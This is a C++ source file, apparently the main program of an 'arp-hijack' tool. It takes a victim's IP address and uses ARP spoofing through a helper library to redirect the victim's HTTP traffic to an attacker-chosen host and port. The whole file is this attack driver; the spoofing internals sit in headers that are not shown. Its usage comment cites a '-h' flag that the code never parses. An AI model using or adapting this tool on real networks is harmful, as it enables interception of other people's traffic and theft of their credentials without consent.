//
// Created by kenny on 2/14/19.
//

/*
 *
 * arp-hijack - Hijack and redirect packets
 *
 * -s [service] which the application is interested in. Default to 80
 *
 * -e [iface] device name
 *
 * -i [ip] that accepts redirected traffic
 *
 * -p [port] number. Default to 8080
 *
 * sudo arp-hijack 192.168.43.79 -h 192.168.43.111
 *
 */
#include "hdrs.h"
#include "arp-hijack.h"

int main(int argc, char *argv[]) {
    int opt;
    const char *devname = nullptr;
    const char *recv_host = nullptr;

    kni::port_t target_port = 80, recv_port = 8080;
    while ((opt = getopt(argc, argv, "e:p:i:s:")) != -1) {
        switch (opt) {
            case 'e':
                devname = optarg;
                break;
            case 's':
                target_port = static_cast<kni::port_t>(atoi(optarg));
                break;
            case 'i':
                recv_host = optarg;
                break;
            case 'p':
                recv_port = static_cast<kni::port_t>(atoi(optarg));
                break;
            default:
                break;
        }
    }

    argc -= optind;
    argv += optind;

    if (argc == 0)
        KNI_FATAL_ERROR("Missing victim's IP address.");

    if (devname == nullptr && (devname = getenv("KNI_DEVNAME")) == nullptr)
        KNI_FATAL_ERROR("Missing device name.");

    if (recv_host == nullptr)
        KNI_FATAL_ERROR("Missing receiver's IP address");

    kni::lan_info lan;
    if (!lan.set_dev(devname) || !lan.update_gateway_ip() || !lan.fetch_arp())
        KNI_FATAL_ERROR("%s", lan.err());

    kni::ipv4_t victim_ip;
    if (inet_pton(AF_INET, argv[0], &victim_ip) == 0)
        KNI_FATAL_ERROR("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
    else if (!lan.is_cached(argv[0]))
        KNI_FATAL_ERROR("Host %s not detected.", argv[0]);

    kni::ipv4_t recv_ip;
    if (inet_pton(AF_INET, recv_host, &recv_ip) == 0)
        KNI_FATAL_ERROR("\"%s\" doesn't contain a valid IPv4 address", recv_host);

    kni::hijack_http hijackHttp(&lan, {recv_ip, recv_port}, target_port);
    hijackHttp.add_victim(victim_ip);

    if (!hijackHttp.open(devname) || !hijackHttp.loop_packets())
        KNI_LOG_ERROR("%s", hijackHttp.err());

    hijackHttp.close();
    KNI_LOG_DEBUG("Process exits...");

    return 0;
}